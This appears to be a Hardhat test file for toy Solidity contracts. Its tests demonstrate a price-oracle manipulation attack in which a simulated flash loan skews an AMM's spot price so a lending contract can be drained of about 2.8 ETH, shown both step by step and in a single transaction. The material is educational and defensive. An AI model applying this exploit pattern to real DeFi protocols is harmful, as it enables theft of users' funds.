const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");
const { calculateSwapAmountTo } = require("./utils");

describe("Oracle Manipulation Attack", function () {
  let usdc;
  let amm;
  let lender;
  let attacker;

  let collateralizationRatio = 8000; // 80%

  beforeEach(async function () {
    const TestUSDC = await ethers.getContractFactory("TestUSDC");
    usdc = await TestUSDC.deploy("test", "tst");
    await usdc.deployed();

    const SimpleAMM = await ethers.getContractFactory("SimpleAMM");
    amm = await SimpleAMM.deploy(usdc.address);
    await amm.deployed();

    const SimpleLender = await ethers.getContractFactory("SimpleLender");
    lender = await SimpleLender.deploy(
      usdc.address,
      amm.address,
      collateralizationRatio
    );
    await lender.deployed();

    const Attacker = await ethers.getContractFactory("Attacker");
    attacker = await Attacker.deploy();
    await attacker.deployed();
  });

  it("Should perform basic AMM swap correctly", async function () {
    const [acc1] = await ethers.getSigners();
    await usdc.mint(acc1.address, ethers.utils.parseEther("3000"));

    // Deposit 3000 USDC and 1 ETH into AMM
    const balanceTo = ethers.utils.parseEther("3000");
    await usdc.transfer(amm.address, balanceTo);
    expect(await amm.balanceUSDC()).to.equal(balanceTo);

    const balanceFrom = ethers.utils.parseEther("1");
    await acc1.sendTransaction({ to: amm.address, value: balanceFrom });
    expect(await amm.balanceETH()).to.equal(balanceFrom);

    // Verify initial prices
    expect(await amm.priceETHUSDC()).to.equal(ethers.utils.parseEther("3000"));
    expect(await amm.priceUSDCETH()).to.equal(
      ethers.utils.parseEther("1").div(3000)
    );

    // Swap 0.01 ETH for USDC
    const fromAmount = ethers.utils.parseEther("0.01");
    await amm.swap(ethers.constants.AddressZero, fromAmount, {
      value: fromAmount,
    });

    const toAmount = calculateSwapAmountTo(balanceFrom, balanceTo, fromAmount);
    const usdcBal = await usdc.balanceOf(acc1.address);
    expect(usdcBal).to.equal(toAmount);

    expect(await amm.balanceETH()).to.equal(balanceFrom.add(fromAmount));
    expect(await amm.balanceUSDC()).to.equal(balanceTo.sub(toAmount));
  });

  it("Should calculate and borrow max amount correctly", async function () {
    const [acc1] = await ethers.getSigners();
    await usdc.mint(acc1.address, ethers.utils.parseEther("6000"));

    // Initialize AMM: 1 ETH + 3000 USDC
    await usdc.transfer(amm.address, ethers.utils.parseEther("3000"));
    await acc1.sendTransaction({
      to: amm.address,
      value: ethers.utils.parseEther("1"),
    });

    // Fund lender with 10 ETH reserves
    await acc1.sendTransaction({
      to: lender.address,
      value: ethers.utils.parseEther("10"),
    });

    // Deposit 3000 USDC as collateral
    const depositAmount = ethers.utils.parseEther("3000");
    await usdc.approve(lender.address, depositAmount);
    await lender.depositUSDC(depositAmount);
    expect(await lender.USDCdeposits(acc1.address)).to.equal(depositAmount);

    // At fair price: max borrow ~0.8 ETH (80% collateralization)
    const maxBorrow = await lender.maxBorrowAmount();
    expect(maxBorrow).to.equal(BigNumber.from("799999999999999200"));

    await lender.borrowETH(maxBorrow);
    expect(await ethers.provider.getBalance(lender.address)).to.equal(
      ethers.utils.parseEther("10").sub("799999999999999200")
    );
  });

  it("Should execute oracle manipulation attack (multi-tx breakdown)", async function () {
    /// SETUP ///
    const [acc1] = await ethers.getSigners();
    const attackerWallet = ethers.Wallet.createRandom().connect(ethers.provider);
    expect(await ethers.provider.getBalance(attackerWallet.address)).to.equal(0);

    // Seed attacker with 0.1 ETH for gas
    await acc1.sendTransaction({
      to: attackerWallet.address,
      value: ethers.utils.parseEther("0.1"),
    });

    // Initialize AMM: 1 ETH + 3000 USDC (fair price: 1 ETH = 3000 USDC)
    await usdc.mint(acc1.address, ethers.utils.parseEther("3000"));
    await usdc.transfer(amm.address, ethers.utils.parseEther("3000"));
    await acc1.sendTransaction({
      to: amm.address,
      value: ethers.utils.parseEther("1"),
    });

    // Verify original price: 1 USDC = 0.00033... ETH
    expect(ethers.utils.formatEther(await amm.priceUSDCETH())).to.equal(
      "0.000333333333333333"
    );

    // Fund lender with 5 ETH reserves
    await acc1.sendTransaction({
      to: lender.address,
      value: ethers.utils.parseEther("5"),
    });

    /// ATTACK EXECUTION ///

    // Step 1: Flash loan 2 ETH (simulated)
    await acc1.sendTransaction({
      to: attackerWallet.address,
      value: ethers.utils.parseEther("2"),
    });

    // Step 2: Swap 2 ETH into AMM → receive 2000 USDC, price is now manipulated
    const fromAmount = ethers.utils.parseEther("2");
    await amm.connect(attackerWallet).swap(ethers.constants.AddressZero, fromAmount, {
      value: fromAmount,
    });

    const toAmount = calculateSwapAmountTo(
      ethers.utils.parseEther("1"),
      ethers.utils.parseEther("3000"),
      fromAmount
    );
    expect(toAmount).to.equal(ethers.utils.parseEther("2000"));

    // AMM now has 3 ETH + 1000 USDC → price inflated 9x
    expect(ethers.utils.formatEther(await amm.balanceETH())).to.equal("3.0");
    expect(ethers.utils.formatEther(await amm.balanceUSDC())).to.equal("1000.0");

    // Manipulated price: 1 USDC = 0.003 ETH (was 0.000333)
    expect(ethers.utils.formatEther(await amm.priceUSDCETH())).to.equal("0.003");

    // Step 3: Deposit 2000 USDC as collateral at manipulated price
    const depositAmount = ethers.utils.parseEther("2000");
    await usdc.connect(attackerWallet).approve(lender.address, depositAmount);
    await lender.connect(attackerWallet).depositUSDC(depositAmount);
    expect(await lender.USDCdeposits(attackerWallet.address)).to.equal(depositAmount);

    // Step 4: Borrow 4.8 ETH (should only be ~0.53 ETH at fair price)
    const maxBorrow = await lender.connect(attackerWallet).maxBorrowAmount();
    expect(maxBorrow).to.equal(ethers.utils.parseEther("4.8"));
    await lender.connect(attackerWallet).borrowETH(maxBorrow);
    expect(await ethers.provider.getBalance(lender.address)).to.equal(
      ethers.utils.parseEther("0.2")
    );

    // Step 5: Repay 2 ETH flash loan
    await attackerWallet.sendTransaction({
      to: acc1.address,
      value: ethers.utils.parseEther("2"),
    });

    // Result: ~2.8 ETH profit (+ 0.1 ETH initial gas funding)
    const profit = ethers.utils.formatEther(
      await ethers.provider.getBalance(attackerWallet.address)
    );
    expect(Math.round(profit * 1e1) / 1e1).to.equal(2.9);
  });

  it("Should execute oracle manipulation attack (single-tx flash loan)", async function () {
    const [acc1] = await ethers.getSigners();

    // Initialize AMM: 1 ETH + 3000 USDC
    await usdc.mint(acc1.address, ethers.utils.parseEther("3000"));
    await usdc.transfer(amm.address, ethers.utils.parseEther("3000"));
    await acc1.sendTransaction({
      to: amm.address,
      value: ethers.utils.parseEther("1"),
    });

    // Fund lender with 5 ETH reserves
    await acc1.sendTransaction({
      to: lender.address,
      value: ethers.utils.parseEther("5"),
    });

    /// SINGLE-TRANSACTION ATTACK ///
    // Simulates flash loan by sending 2 ETH to the Attacker contract
    await attacker.executeAttack(amm.address, usdc.address, lender.address, {
      value: ethers.utils.parseEther("2"),
    });

    // 2.8 ETH profit in a single transaction
    expect(
      ethers.utils.formatEther(
        await ethers.provider.getBalance(attacker.address)
      )
    ).to.equal("2.8");
  });
});
